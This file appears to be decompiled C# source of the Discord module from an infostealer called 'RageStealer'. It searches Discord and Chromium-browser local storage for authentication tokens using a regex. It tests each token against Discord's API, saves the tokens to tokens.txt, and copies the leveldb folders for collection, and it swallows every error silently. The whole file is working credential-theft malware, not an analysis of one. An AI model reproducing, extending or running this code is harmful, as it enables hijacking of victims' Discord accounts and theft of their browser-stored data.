using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Messengers;

internal sealed class Discord
{
	private static readonly Regex TokenRegex = new Regex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}|mfa\\.[a-zA-Z0-9_\\-]{84}");

	private static readonly string[] DiscordDirectories = new string[3] { "Discord\\Local Storage\\leveldb", "Discord PTB\\Local Storage\\leveldb", "Discord Canary\\leveldb" };

	public static void WriteDiscord(string[] lcDicordTokens, string sSavePath)
	{
		if (lcDicordTokens.Length != 0)
		{
			Directory.CreateDirectory(sSavePath);
			try
			{
				foreach (string text in lcDicordTokens)
				{
					File.AppendAllText(sSavePath + "\\tokens.txt", text + "\n");
				}
			}
			catch
			{
			}
			Counter.Discord = true;
			Counter.DiscordTokens = lcDicordTokens.Length + 1;
		}
		try
		{
			CopyLevelDb(sSavePath);
		}
		catch
		{
		}
	}

	private static void CopyLevelDb(string sSavePath)
	{
		string[] discordDirectories = DiscordDirectories;
		foreach (string path in discordDirectories)
		{
			string directoryName = Path.GetDirectoryName(Path.Combine(Paths.Appdata, path));
			if (directoryName == null)
			{
				continue;
			}
			string destFolder = Path.Combine(sSavePath, new DirectoryInfo(directoryName).Name);
			if (Directory.Exists(directoryName))
			{
				try
				{
					Filemanager.CopyDirectory(directoryName, destFolder);
				}
				catch
				{
				}
			}
		}
		discordDirectories = Paths.SChromiumPswPaths;
		foreach (string text in discordDirectories)
		{
			string path2 = ((!text.Contains("Opera Software")) ? (Paths.Lappdata + text) : (Paths.Appdata + text));
			path2 = Path.GetDirectoryName(Path.Combine(path2, "Local Storage\\leveldb"));
			if (path2 == null)
			{
				continue;
			}
			string destFolder2 = Path.Combine(sSavePath, new DirectoryInfo(path2).Name);
			if (Directory.Exists(path2))
			{
				try
				{
					Filemanager.CopyDirectory(path2, destFolder2);
				}
				catch
				{
				}
			}
		}
	}

	private static string TokenState(string token)
	{
		try
		{
			using WebClient webClient = new WebClient();
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			webClient.Headers.Add("Authorization", token);
			webClient.Headers.Add("accept", "application/json");
			return webClient.DownloadString("https://discordapp.com/api/v6/users/@me").Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
		}
		catch
		{
		}
		return "Connection error";
	}

	public static string[] GetTokens()
	{
		List<string> list = new List<string>();
		try
		{
			string[] discordDirectories = DiscordDirectories;
			foreach (string path in discordDirectories)
			{
				string text2 = Path.Combine(Paths.Appdata, path);
				string text3 = Path.Combine(Path.GetTempPath(), new DirectoryInfo(text2).Name);
				if (Directory.Exists(text2))
				{
					Filemanager.CopyDirectory(text2, text3);
					list.AddRange(from file in Directory.GetFiles(text3)
						where file.EndsWith(".log") || file.EndsWith(".ldb")
						select File.ReadAllText(file) into text
						select TokenRegex.Match(text) into match
						where match.Success
						select match.Value + " - " + TokenState(match.Value));
					Filemanager.RecursiveDelete(text3);
				}
			}
			discordDirectories = Paths.SChromiumPswPaths;
			foreach (string text4 in discordDirectories)
			{
				string path2 = ((!text4.Contains("Opera Software")) ? (Paths.Lappdata + text4) : (Paths.Appdata + text4));
				path2 = Path.GetDirectoryName(Path.Combine(path2, "Local Storage\\leveldb"));
				string text5 = Path.Combine(Path.GetTempPath(), new DirectoryInfo(path2).Name);
				if (Directory.Exists(path2))
				{
					Filemanager.CopyDirectory(path2, text5);
					list.AddRange(from file in Directory.GetFiles(text5)
						where file.EndsWith(".log") || file.EndsWith(".ldb")
						select File.ReadAllText(file) into text
						select TokenRegex.Match(text) into match
						where match.Success
						select match.Value + " - " + TokenState(match.Value));
					Filemanager.RecursiveDelete(text5);
				}
			}
		}
		catch
		{
		}
		return list.ToArray();
	}
}
